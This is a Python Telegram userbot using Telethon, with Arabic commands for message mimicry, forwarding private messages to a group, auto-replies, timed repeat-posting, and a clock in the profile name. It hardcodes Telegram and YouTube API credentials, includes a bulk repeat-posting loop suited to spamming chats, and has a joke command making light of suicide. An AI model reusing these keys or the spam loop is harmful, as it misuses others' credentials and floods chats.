from telethon.sync import TelegramClient, events
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.errors.rpcerrorlist import MessageNotModifiedError, FloodWaitError
from telethon.tl.types import ChannelParticipantCreator, ChannelParticipantAdmin
from telethon.tl.functions.channels import GetParticipantsRequest
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import ChatBannedRights
from telethon.errors import UserAdminInvalidError, ChatAdminRequiredError
from telethon import events, functions
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.tl.types import User
from telethon.types import InputWebDocument
from telethon.errors import MediaEmptyError, WebpageMediaEmptyError, WebpageCurlFailedError
from telethon.tl.functions.photos import GetUserPhotosRequest
from sqlalchemy import Column, Integer, String
from telethon.tl.types import InputMessagesFilterDocument
from telethon.utils import get_input_photo
from telethon import functions, events
from telethon.tl.functions.messages import EditMessageRequest
from telethon.tl.types import ChannelParticipantsAdmins, UserStatusEmpty, UserStatusLastMonth, UserStatusLastWeek, UserStatusRecently, UserStatusOnline
from telethon.tl.types import InputPeerUser, InputPeerChannel
from telethon.errors.rpcerrorlist import PeerIdInvalidError
from pySmartDL import SmartDL
from telethon.tl.types import MessageActionChannelMigrateFrom
from telethon import events, Button
from queue import Queue
from telethon.sync import functions
from telethon.tl.types import InputChatUploadedPhoto
from user_agent import generate_user_agent
from threading import Thread
from telethon.tl.functions.messages import ReportSpamRequest
from telethon import types
from telethon.tl import functions
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon import events, functions
from telethon.tl.types import Message
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.events import NewMessage
from telethon import events 
from telethon.tl.types import InputPeerChat
from telethon import errors
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.types import MessageMediaPhoto
from telethon.tl.types import MessageMediaDocument
import pybase64
from telethon import events, functions, utils
from telethon.tl import functions, types
from telethon.tl.types import MessageEntityMentionName
from telethon.errors import ChatAdminRequiredError
from telethon.tl.types import InputChannel
from deep_translator import GoogleTranslator
from telethon import TelegramClient, events
from telethon.tl.types import ChannelParticipantsAdmins        
from telethon.errors import ChannelInvalidError
from langdetect import detect  
from telethon.tl.types import ChannelParticipantsSearch
from telethon.tl.functions.channels import EditTitleRequest
from datetime import datetime
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.functions.photos import DeletePhotosRequest
from telethon.errors.rpcerrorlist import (
    StickerMimeInvalidError, 
    PhotoExtInvalidError, 
    PhotoCropSizeSmallError, 
    ImageProcessFailedError )
from telethon import TelegramClient, events
from telethon import TelegramClient, events, sync 
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from googletrans import LANGUAGES
from sqlalchemy import create_engine, Column, Integer, String
from sqlalchemy.ext.declarative import declarative_base
from gpytranslate import Translator
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest
from telethon.tl.types import InputPhoto
from telethon.tl.functions.channels import EditPhotoRequest
from googletrans import Translator
from telethon import events
from telethon import functions
from telethon.tl.functions.messages import GetFullChatRequest
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.errors.rpcerrorlist import MessageIdInvalidError
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from datetime import datetime
from sqlalchemy import create_engine
from telethon.tl.types import InputMessagesFilterDocument, InputMessagesFilterPhotos
from asyncio import sleep
from sqlalchemy.orm import sessionmaker
from datetime import datetime, timedelta
from telethon.tl.types import Channel, Chat
from dateutil import tz
from emoji import emojize
from datetime import datetime
from telethon.tl.custom import Button
from math import sqrt
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.errors.rpcerrorlist import WebpageMediaEmptyError
from telethon.tl.functions.messages import DeleteMessagesRequest
import sys
import pytz
import asyncio
import os
import datetime as dt
import base64
import events
import platform
from telethon import version as telethon_version
from telethon import events
from ping3 import ping
import pickle
import string
import re
import json
import mention
import requests
import io
import aiohttp
import random
import threading
import html
import telethon
import logging
import shutil
import time
os.system("clear")
print("""\033[031m
⠀⠀⠀⠠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢈⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣴⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣴⣿⡷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣾⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣧⠀⠀⠀⠘⣦⡀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡇⠀⠀⠀⢀⣼⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠹⣿⣿⣿⣷⣦⣄⡀⣿⣱⡀⠀⠀⠀⠀⠀⠀⢸⢿⣧⣠⣴⣾⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠛⢷⣿⣟⡿⠿⠿⡟⣓⣒⣛⡛⡛⢟⣛⡛⠟⠿⣻⢿⣿⣻⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣴⢻⡭⠖⡉⠥⣈⠀⣐⠂⡄⠔⢂⢦⡹⢬⡕⠊⠳⠈⢿⣳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣼⣷⣋⠲⢮⣁⠀⣐⠆⡤⢊⣜⡀⡾⣀⠀⢠⢻⣌⣤⣥⣓⣌⢻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⣟⣽⢳⣯⣝⣦⡀⠓⡤⢆⠇⠂⠄⠤⡝⣂⠋⠖⢋⠀⣡⣶⣾⡿⡷⣽⡿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⡜⢯⣿⣿⣿⣷⣿⣤⣧⣶⣬⣝⣃⣓⣈⣥⣶⣿⣾⣿⣿⢣⠇⢻⡞⣯⣹⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢻⣼⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡔⡯⢧⢟⣟⣱⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿𝗘𝗩𝗔 𝗦𝗢𝗨𝗥𝗖𝗘⣿⣿⣿⣿⣿⡟⡼⡼⢁⡌⢼⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⢇⡼⢃⡿⣼⣛⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⠟⣡⣫⣢⢏⣼⡵⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣏⢿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⡾⢕⣻⣽⣵⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⢷⣮⣿⡼⢭⡟⠳⠞⡖⢛⣶⣷⣯⡶⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⠛⠛⠛⠿⠟⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

𝐃𝐞𝐯:@X_54P
""")
api_id = '26107707'
api_hash = 'e3774389da1ff2e49f3cfb38c2105c87'
phone_number = input(": ")

session_name = 'Eva surce'
response_file = 'response.pkl'
published_messages_file = 'publishd_messages.pkl'
muted_users_file = 'muted_usrs.pkl'
time_update_status_file = 'tme_update_status.pkl'
channel_link_file = 'channel_link.pl'
image_folder = 'path_to_imagefolder'
response_file = 'path_to_respons_file'
last_message_time_file = 'path_to_last_messge_time_file'
last_message_id_file = 'path_to_last_mesage_id_file'
responses = {}
user_last_message_time = {}
user_last_message_id = {}
user_last_message_time_sent = {}
active_publishing_tasks = {}
image_folder = "imae"
if not os.path.exists(image_folder):
    os.makedirs(image_folder)

client = TelegramClient(session_name, api_id, api_hash)
client.start(phone_number)


if os.path.exists(response_file):
    with open(response_file, 'rb') as f:
        responses = pickle.load(f)
else:
    responses = {}

if os.path.exists(channel_link_file):
    with open(channel_link_file, 'rb') as f:
        channel_link = pickle.load(f)
else:
    channel_link = None


if os.path.exists(time_update_status_file):
    with open(time_update_status_file, 'rb') as f:
        time_update_status = pickle.load(f)
else:
    time_update_status = {'enabled': False}


if os.path.exists(muted_users_file):
    with open(muted_users_file, 'rb') as f:
        muted_users = pickle.load(f)
else:
    muted_users = {}



if os.path.exists(response_file):
    with open(response_file, 'rb') as f:
        responses = pickle.load(f)
else:
    responses = {}

if os.path.exists(published_messages_file):
    with open(published_messages_file, 'rb') as f:
        published_messages = pickle.load(f)
else:
    published_messages = []


active_timers = {}
countdown_messages = {}


image_path = 'local_image.jpg'


account_name = None

def insert_emojis(message, emojis):
    random.shuffle(emojis)
    message_list = list(message)
    emoji_positions = []
    
    for emoji in emojis:
        pos = random.choice(range(len(message_list)))
        while pos in emoji_positions:
            pos = random.choice(range(len(message_list)))
        
        emoji_positions.append(pos)
        message_list[pos] = emoji
    
    return ''.join(message_list)

@client.on(events.NewMessage(from_users='me', pattern='.متت'))
async def update_message(event):
    await event.delete()
    message_text = ' ' * 6
    emojis = ['🤣', '😂', '😹', '🤣', '😂', '😹']
    
    message = await event.respond('🤣😂😹🤣😂😹')
    
    last_message = ""
    start_time = asyncio.get_event_loop().time()
    duration = 5  
    
    while True:
        try:
            current_time = asyncio.get_event_loop().time()
            if current_time - start_time > duration:
                break
            
            emoji_string = insert_emojis(message_text, emojis)
            while emoji_string == last_message:
                emoji_string = insert_emojis(message_text, emojis)
            
            last_message = emoji_string
            await message.edit(emoji_string)
            
            await asyncio.sleep(0)

        except Exception as e:
            print(f"Error updating message: {e}")
            break


mimic_user_id = None


@client.on(events.NewMessage(from_users='me', pattern='.تقليد'))
async def set_mimic_user(event):
    global mimic_user_id
    if event.is_reply:
        
        reply_message = await event.get_reply_message()
        mimic_user_id = reply_message.sender_id
        await event.reply(f"⎙ سيتم تقليد المستخدم {mimic_user_id}.")
        await event.delete()
    else:
        await event.reply("⎙ يرجى الرد على رسالة الشخص الذي تريد تقليده.")


@client.on(events.NewMessage())
async def mimic_user(event):
    global mimic_user_id
    if mimic_user_id and event.sender_id == mimic_user_id:
        
        await client.send_message(event.chat_id, event.text)


@client.on(events.NewMessage(from_users='me', pattern='.ايقاف التقليد'))
async def stop_mimic(event):
    global mimic_user_id
    mimic_user_id = None
    await event.reply("⎉╎تم ايـقـاف الـتـقـلـيـد .. بنجـاح ☑️.")
    await event.delete()

@client.on(events.NewMessage(from_users='me', pattern='.رفع كيك'))
async def stop_mimic(event):
    global mimic_user_id
    mimic_user_id = None
    await event.reply("تم رفع المستخدم كييكه.")
    await event.delete()

@client.on(events.NewMessage(from_users='me', pattern='.انتحار'))
async def suicide_message(event):
    await event.delete()
    
    
    message = await event.respond("**جاري الانتحار .....**")
    
    
    await asyncio.sleep(3)
    
    
    final_message = (
        "تم الانتحار بنجاح😂...\n"
        "　　　　　|\n"
        "　　　　　|\n"
        "　　　　　|\n"
        "　　　　　|\n"
        "　　　　　|\n"
        "　　　　　|\n"
        "　　　　　|\n"
        "　　　　　|\n"
        "　／￣￣＼| \n"
        "＜ ´･ 　　 |＼ \n"
        "　|　３　 | 丶＼ \n"
        "＜ 、･　　|　　＼ \n"
        "　＼＿＿／∪ _ ∪) \n"
        "　　　　　 Ｕ Ｕ"
    )
    
    await message.edit(final_message)

def insert_emojis(message, emojis):
    random.shuffle(emojis)
    message_list = list(message)
    emoji_positions = []
    
    for emoji in emojis:
        pos = random.choice(range(len(message_list)))
        while pos in emoji_positions:
            pos = random.choice(range(len(message_list)))
        
        emoji_positions.append(pos)
        message_list[pos] = emoji
    
    return ''.join(message_list)

@client.on(events.NewMessage(from_users='me', pattern='.شرير'))
async def update_message(event):
    await event.delete()
    message_text = ' ' * 6
    emojis = ['😈', '💀', '👿', '🔪', '☠️', '👹']
    
    message = await event.respond('👿💀👹👿🔪☠️')
    
    last_message = ""
    start_time = asyncio.get_event_loop().time()
    duration = 5  
    
    while True:
        try:
            current_time = asyncio.get_event_loop().time()
            if current_time - start_time > duration:
                break
            
            emoji_string = insert_emojis(message_text, emojis)
            while emoji_string == last_message:
                emoji_string = insert_emojis(message_text, emojis)
            
            last_message = emoji_string
            await message.edit(emoji_string)
            
            await asyncio.sleep(0)

        except Exception as e:
            print(f"Error updating message: {e}")
            break

@client.on(events.NewMessage(from_users='me', pattern='.تفعيل التخزين'))
async def add_group(event):
    await event.delete()
    try:
        
        group_id = event.chat_id
        
        
        with open('group_id.pkl', 'wb') as f:
            pickle.dump(group_id, f)
        
        
        group = await client.get_entity(group_id)
        group_name = group.title
        group_type = "قناة" if isinstance(group, Channel) else "مجموعة"

        
        await event.reply(f"⎙ تم تعيين المجموعة إلى: {group_name} ({group_type})")
    except Exception as e:
        await event.reply(f"⎙ حدث خطأ: {str(e)}")


@client.on(events.NewMessage(incoming=True))
async def forward_private_message(event):
    
    if os.path.exists('group_id.pkl'):
        with open('group_id.pkl', 'rb') as f:
            group_id = pickle.load(f)
    else:
        group_id = None

    if event.is_private and not (await event.get_sender()).bot:
        if group_id:
            
            await client.forward_messages(group_id, event.message)

            
            sender = await event.get_sender()
            group_name = (await client.get_entity(group_id)).title
            timestamp = time.strftime("%H:%M")
            message_text = event.message.text or "لا يوجد نص للرسالة"
            user_mention = f"@{sender.username}" if sender.username else "لا يوجد معرف مستخدم"

            info_message = (
                f"⌔┊ لديك منشن من العضو: {sender.first_name}\n"  
                f"⌔┊ الكــروب: {group_name}\n"
                f"⌔┊ الــوقــت: {timestamp}\n"
                f"⌔┊ الرســالـه الرسالة: {message_text}\n"
                f"⌔┊ المـرسـل: {user_mention}"
            )
            await client.send_message(group_id, info_message)
        else:
            await event.reply("")


@client.on(events.NewMessage(incoming=True))
async def forward_group_message(event):
    
    if os.path.exists('group_id.pkl'):
        with open('group_id.pkl', 'rb') as f:
            group_id = pickle.load(f)
    else:
        group_id = None

    if event.is_group and group_id:
        
        if event.reply_to_msg_id:
            replied_message = await event.get_reply_message()
            reply_sender = await client.get_entity(replied_message.sender_id)
            bot_id = (await client.get_me()).id

            
            if replied_message.sender_id == bot_id:
                
                await client.forward_messages(group_id, event.message)

                
                sender = await event.get_sender()  
                group_name = (await client.get_entity(group_id)).title
                timestamp = time.strftime("%H:%M")
                message_text = event.message.text or "لا يوجد نص للرسالة"
                user_mention = f"@{sender.username}" if sender.username else "لا يوجد معرف مستخدم"

                info_message = (
                    f"⌔┊ لديك منشن من العضو: {sender.first_name}\n"  
                    f"⌔┊ اسم الجروب: {group_name}\n"
                    f"⌔┊ الوقت: {timestamp}\n"
                    f"⌔┊ نص الرسالة: {message_text}\n"
                    f"⌔┊ اليوزر: {user_mention}"
                )
                await client.send_message(group_id, info_message)


signature = (
    " {response}\n\n"
)



if os.path.exists(response_file):
    with open(response_file, 'rb') as f:
        responses = pickle.load(f)


if os.path.exists(last_message_time_file):
    with open(last_message_time_file, 'rb') as f:
        user_last_message_time = pickle.load(f)


if os.path.exists(last_message_id_file):
    with open(last_message_id_file, 'rb') as f:
        user_last_message_id = pickle.load(f)


if os.path.exists('path_to_last_message_sent_time_file'):
    with open('path_to_last_message_sent_time_file', 'rb') as f:
        user_last_message_time_sent = pickle.load(f)


@client.on(events.NewMessage(from_users='me', pattern='.رد'))
async def add_response(event):
    await event.delete()
    try:
        photo_path = None

        
        if event.reply_to_msg_id:
            
            replied_message = await client.get_messages(event.chat_id, ids=event.reply_to_msg_id)
            
            
            if replied_message.photo:
                
                photo_path = os.path.join(image_folder, f"{event.reply_to_msg_id}.jpg")
                await client.download_media(replied_message, file=photo_path)

        
        if ' ' in event.raw_text:
            _, response = event.raw_text.split(' ', 1)
            response = response.strip()

            
            full_response = signature.format(response=response)

            
            responses['response'] = {
                'response': full_response,
                'photo': photo_path
            }
            
            
            with open(response_file, 'wb') as f:
                pickle.dump(responses, f)
            
            if photo_path:
                await event.reply("⎉╎تم إضافة الرد مع الصورة .. بنجـاح ☑️.")
            else:
                await event.reply("⎉╎تم إضافة الرد بدون صورة .. بنجـاح ☑️.")
        else:
            await event.reply("⎙ يجب استخدام الصيغة الصحيحة: رد الرد")

    except Exception as e:
        await event.reply(f"حدث خطأ: {str(e)}")


@client.on(events.NewMessage(incoming=True))
async def respond_to_message(event):
    try:
        
        if event.is_private:
            user_id = event.sender_id
            current_time = datetime.now()

            
            last_message_time_sent = user_last_message_time_sent.get(user_id, datetime.now() - timedelta(minutes=5))
            last_message_id = user_last_message_id.get(user_id)

            
            if (current_time - last_message_time_sent).total_seconds() >= 240:
                response_data = responses.get('response', {})
                keyword_response = response_data.get('response')
                photo_path = response_data.get('photo')

                if keyword_response:
                    
                    if last_message_id:
                        try:
                            await client.delete_messages(event.chat_id, last_message_id)
                        except Exception as e:
                            print(f"")

                    
                    if photo_path and os.path.exists(photo_path):
                        message = await event.respond(keyword_response, file=photo_path)
                    else:
                        message = await event.respond(keyword_response)
                    
                    
                    user_last_message_id[user_id] = message.id

                else:
                    await event.respond("")
                
                
                user_last_message_time_sent[user_id] = current_time
                with open('path_to_last_message_sent_time_file', 'wb') as f:
                    pickle.dump(user_last_message_time_sent, f)

            
            user_last_message_time[user_id] = current_time
            with open(last_message_time_file, 'wb') as f:
                pickle.dump(user_last_message_time, f)

            
            with open(last_message_id_file, 'wb') as f:
                pickle.dump(user_last_message_id, f)

    except Exception as e:
        print(f"حدث خطأ في الرد على الرسالة: {str(e)}")


@client.on(events.NewMessage(from_users='me', pattern='.add'))
async def add_response(event):
    await event.delete()
    try:
        photo_path = None

        
        if event.reply_to_msg_id:
            
            replied_message = await client.get_messages(event.chat_id, ids=event.reply_to_msg_id)
            
            
            if replied_message.photo:
                
                photo_path = os.path.join(image_folder, f"{event.reply_to_msg_id}.jpg")
                await client.download_media(replied_message, file=photo_path)

        
        if ' ' in event.raw_text:
            _, args = event.raw_text.split(' ', 1)
            if '(' in args and ')' in args:
                keyword, response = args.split('(', 1)[1].split(')', 1)
                keyword = keyword.strip().lower()
                response = response.strip()

                
                responses[keyword] = {
                    'response': response,
                    'photo': photo_path
                }
                
                
                with open(response_file, 'wb') as f:
                    pickle.dump(responses, f)
                
                if photo_path:
                    await event.reply("⎉╎تم إضافة الرد مع الصورة .. بنجـاح ☑️.")
                else:
                    await event.reply("⎉╎تم إضافة الرد بدون صورة .. بنجـاح ☑️.")
            else:
                await event.reply("⎙ يجب استخدام الصيغة الصحيحة: .add (الكلمة المفتاحية) الرد.")
        else:
            await event.reply("⎙ يجب استخدام الصيغة الصحيحة: .add (الكلمة المفتاحية) الرد.")

    except Exception as e:
        await event.reply(f"حدث خطأ: {str(e)}")


@client.on(events.NewMessage(from_users='me', pattern='.الردود'))
async def show_responses(event):
    await event.delete()
    try:
        if responses:
            message = "⎙ الردود المضافة:\n"
            for keyword, data in responses.items():
                photo_status = "مضافة إليه صورة" if data['photo'] else "غير مضافة إليه صورة"
                message += f"🔹 الكلمة المفتاحية: {keyword}\n🔸 الرد: {data['response']} ({photo_status})\n"
            await event.reply(message)
        else:
            await event.reply("⎙ لا توجد ردود مضافة حتى الآن.")
    except Exception as e:
        await event.reply(f"حدث خطأ: {str(e)}")


@client.on(events.NewMessage(incoming=True))
async def respond_to_greeting(event):
    if event.is_private and not (await event.get_sender()).bot:
        message_text = event.raw_text.lower()
        for keyword, data in responses.items():
            if keyword in message_text:
                try:
                    if data['photo']:
                        await client.send_file(event.chat_id, file=data['photo'], caption=data['response'])
                    else:
                        await event.reply(data['response'])
                except Exception as e:
                    await event.reply(f"حدث خطأ: {str(e)}")
                break

async def respond_to_mention(event):
    if event.is_private and not (await event.get_sender()).bot:  
        sender = await event.get_sender()
        await event.reply(f"انتظر يجي المطور @{sender.username} ويرد على رسالتك لا تبقه تمنشنه هواي")
client.add_event_handler(respond_to_mention, events.NewMessage(incoming=True, pattern=f'(?i)@{client.get_me().username}'))

def superscript_time(time_str):
    superscript_digits = str.maketrans('0123456789', '𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟭𝟴𝟵')
    return time_str.translate(superscript_digits)

async def get_account_name():
    me = await client.get_me()
    return re.sub(r' - \d{2}:\d{2}', '', me.first_name)

async def update_username():
    global account_name
    iraq_tz = pytz.timezone('Asia/Baghdad')

    
    if account_name is None:
        account_name = await get_account_name()

    while True:
        now = datetime.now(iraq_tz)
        current_time = superscript_time(now.strftime("%I:%M"))

        
        current_name = await get_account_name()
        if current_name != account_name:
            account_name = current_name  

        
        if time_update_status.get('enabled', False):
            new_username = f"{account_name} - {current_time}"
        else:
            new_username = f"{account_name}"

        try:
            
            await client(UpdateProfileRequest(first_name=new_username))
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds)
        except Exception as e:
            print(f"Error updating username: {e}")
        
        
        seconds_until_next_minute = 60 - now.second
        await asyncio.sleep(seconds_until_next_minute)


base_images_dir = os.path.join(os.getcwd(), 'images')

@client.on(events.NewMessage(from_users='me', pattern=r'.تكرار (\d+) (\d+) ?([\s\S]*)'))
@client.on(events.NewMessage(from_users='me', pattern=r'.تك (\d+) (\d+) ?([\s\S]*)'))
@client.on(events.NewMessage(from_users='me', pattern=r'.نشر (\d+) (\d+) ?([\s\S]*)'))
async def start_repeating_process(event):
    await event.delete()
    try:
        seconds = int(event.pattern_match.group(1))
        repeat_count = int(event.pattern_match.group(2))
        custom_text = event.pattern_match.group(3)
        
        
        if seconds < 40:
            await event.reply("⎙ يجب أن يكون الوقت المحدد لا يقل عن 40 ثانية.")
            return

        process_images_dir = None
        media_files = []

        if event.is_reply:
            message = await event.get_reply_message()
            
            
            process_id = int(time.time())  
            process_images_dir = os.path.join(base_images_dir, str(process_id))
            os.makedirs(process_images_dir)

            
            if message.media:
                if message.grouped_id:  
                    messages = await client.get_messages(event.chat_id, min_id=message.id - 10, max_id=message.id + 10)
                    for msg in messages:
                        if msg.grouped_id == message.grouped_id and msg.photo:
                            file_path = os.path.join(process_images_dir, f"image_{msg.id}.jpg")
                            await msg.download_media(file=file_path)
                            media_files.append(file_path)
                else:
                    if message.photo:
                        file_path = os.path.join(process_images_dir, f"image_{message.id}.jpg")
                        await message.download_media(file=file_path)
                        media_files.append(file_path)

            if not media_files and not custom_text:
                await event.reply("⎙ يجب تحديد نص مخصص أو الرد على صورة.")
                return

        async def task():
            for i in range(repeat_count):
                if media_files:
                    await client.send_file(event.chat_id, media_files, caption=custom_text)
                else:
                    await client.send_message(event.chat_id, custom_text)
                
                await asyncio.sleep(seconds)
            
            
            if process_images_dir and os.path.exists(process_images_dir):
                shutil.rmtree(process_images_dir)
            
            active_publishing_tasks.pop(event.chat_id, None)

        task = asyncio.create_task(task())
        
        
        if event.chat_id not in active_publishing_tasks:
            active_publishing_tasks[event.chat_id] = []
        active_publishing_tasks[event.chat_id].append((task, process_images_dir))
        
        
        await asyncio.sleep(2)
        confirmation_message = await event.reply(f"سيتم إرسال الرسالة كل {seconds} ثانية لـ {repeat_count} مرات.")

        
        await asyncio.sleep(1)
        await event.delete()
        await confirmation_message.delete()

    except Exception as e:
        await event.reply(f"⎙ حدث خطأ: {e}")

@client.on(events.NewMessage(from_users='me', pattern=r'.ايقاف النشر التلقائي'))
async def stop_sending(event):
    await event.delete()
    try:
        if event.chat_id in active_publishing_tasks:
            for task, process_images_dir in active_publishing_tasks[event.chat_id]:
                task.cancel()
                
                if process_images_dir and os.path.exists(process_images_dir):
                    shutil.rmtree(process_images_dir)
            
            del active_publishing_tasks[event.chat_id]

            
            confirmation_message = await event.reply("   ‌‎✓ تم إيقاف جميع عمليات النشر المفعله   ‌‎⎙.")
            
            
            await asyncio.sleep(1)
            await event.delete()
            
            
            await asyncio.sleep(3)
            await confirmation_message.delete()

        else:
            await event.reply("   ‌‎⎙ لا توجد عمليات نشر فعّالة لإيقافها.")
    except Exception as e:
        await event.reply(f"⎙ حدث خطأ: {e}")


YOUTUBE_API_KEY = 'AIzaSyBfb8a-Ug_YQFrpWKeTc88zuI6PmHVdzV0'
YOUTUBE_API_URL = 'https://www.googleapis.com/youtube/v3/search'

@client.on(events.NewMessage(from_users='me', pattern=r'.يوتيوب (.+)'))
async def youtube_search(event):
    await event.delete()
    query = event.pattern_match.group(1)
    
    async with aiohttp.ClientSession() as session:
        async with session.get(YOUTUBE_API_URL, params={
            'part': 'snippet',
            'q': query,
            'key': YOUTUBE_API_KEY,
            'type': 'video',
            'maxResults': 1
        }) as response:
            data = await response.json()
            if data['items']:
                video_id = data['items'][0]['id']['videoId']
                video_url = f"https://www.youtube.com/watch?v={video_id}"
                await event.reply(f"📹 هنا رابط الفيديو الذي تم العثور عليه:\n{video_url}")
            else:
                await event.reply("⎙ لم يتم العثور على فيديو يتطابق مع العنوان المطلوب.")

@client.on(events.NewMessage(from_users='me', pattern='.تفعيل الاسم الوقتي'))
async def enable_time_update(event):
    await event.delete()
    global time_update_status
    time_update_status['enabled'] = True
    with open(time_update_status_file, 'wb') as f:
        pickle.dump(time_update_status, f)
    reply = await event.reply("✓ تم تفعيل الاسم مع الوقت   ‌‎⎙.")
    await event.delete()  

    await asyncio.sleep(1)
    await reply.delete()  

@client.on(events.NewMessage(from_users='me', pattern='.تعطيل الاسم الوقتي'))
async def disable_time_update(event):
    await event.delete()
    global time_update_status
    time_update_status['enabled'] = False
    with open(time_update_status_file, 'wb') as f:
        pickle.dump(time_update_status, f)
    
    
    if account_name:
        iraq_tz = pytz.timezone('Asia/Baghdad')
        now = datetime.now(iraq_tz)
        current_name = re.sub(r' - \d{2}:\d{2}', '', account_name)
        new_username = f"{current_name}"
        
        try:
            await client(UpdateProfileRequest(first_name=new_username))
